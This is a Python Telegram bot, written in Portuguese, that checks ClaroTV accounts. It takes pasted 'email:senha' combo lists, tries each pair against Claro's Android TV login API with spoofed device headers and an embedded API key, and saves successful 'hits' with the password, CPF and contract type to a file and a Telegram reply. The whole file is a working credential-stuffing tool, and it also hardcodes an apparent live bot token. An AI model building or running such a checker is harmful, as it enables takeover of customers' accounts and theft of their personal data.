import os
import json
import requests
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# === CONFIGURAÇÕES ===
TELEGRAM_BOT_TOKEN = '7824363728:AAHXoxtlhsLXfEZdw6XQjqRKBoVEyUvMdqw'  # Substitua pelo seu token real

# === FUNÇÕES DE LOGIN CLAROTV ===
def generate_guid(length=15):
    import random, string
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def login_request(email, senha):
    guid = generate_guid()
    headers = {
        "authority": "androidtv-mediation-layer.clarobrasil.mobi",
        "scheme": "https",
        "user-agent": "ClaroDASH",
        "accept-language": "en-GB, en",
        "x-device-type": "smart_tv",
        "x-operating-system": "androidtv",
        "x-operating-system-version": "10.0.0.0",
        "x-client-app-version": "1.11.0.0",
        "x-api-key": "b443518f-54cf-4e40-aaf6-6598bf8ac48c",
        "x-device-id": guid,
        "accept-encoding": "gzip"
    }
    payload = {"username": email, "password": senha}
    response = requests.post(
        "https://androidtv-mediation-layer.clarobrasil.mobi/api/auth/login",
        json=payload,
        headers=headers
    )
    return response

def salvar_hit(info):
    os.makedirs("hits", exist_ok=True)
    with open("hits/clarotv_hits.txt", "a", encoding="utf-8") as f:
        f.write(info + "\n")

def formatar_hit(email, senha, dados):
    return (
        f"╔《《🅥🅡🅒🅞🅝🅝🅔🅒🅣》》╗\n"
        f"║ Email: {email}\n"
        f"║ Senha: {senha}\n"
        f"║ User_cpf: {dados.get('data', {}).get('user_cpf', 'N/A')}\n"
        f"║ Tipo_de_contrato: {dados.get('data', {}).get('contract_type', 'N/A')}\n"
        f"║  Conta Válida!✅️\n"
        f"╚》🇧🇷●🅒🅛🅐🅡🅞🅣🅥+🇧🇷"
    )

# === HANDLERS TELEGRAM ===
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Bem-vindo ao bot de verificação ClaroTV!\n\n"
        "Cole abaixo uma lista de combos no formato:\n"
        "`email:senha`\n\n"
        "Exemplo:\n"
        "`teste1@email.com:senha123`\n"
        "`teste2@email.com:senha456`",
        parse_mode="Markdown"
    )

async def processar_combos(update: Update, context: ContextTypes.DEFAULT_TYPE):
    texto = update.message.text
    linhas = [linha.strip() for linha in texto.strip().split('\n') if ':' in linha]

    total_testadas = 0
    total_validas = 0

    for linha in linhas:
        try:
            email, senha = linha.split(':', 1)
            total_testadas += 1
            await update.message.reply_text(f"Testando: {email}")

            response = login_request(email, senha)
            if response.status_code != 200:
                await update.message.reply_text(f"[CONTA INVÁLIDA ❌] - {email}")
                continue

            dados = response.json()
            if dados.get("success"):
                total_validas += 1
                hit = formatar_hit(email, senha, dados)
                salvar_hit(hit)
                await update.message.reply_text(hit)
            else:
                await update.message.reply_text(f"[NÃO APROVADA ❌] - {email}")

        except Exception as e:
            await update.message.reply_text(f"[ERRO] - {linha} - {str(e)}")

    await update.message.reply_text(f"✅ Finalizado: {total_testadas} testadas | {total_validas} válidas")

# === MAIN ===
def main():
    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, processar_combos))
    print("Bot rodando...")
    app.run_polling()

if __name__ == "__main__":
    main()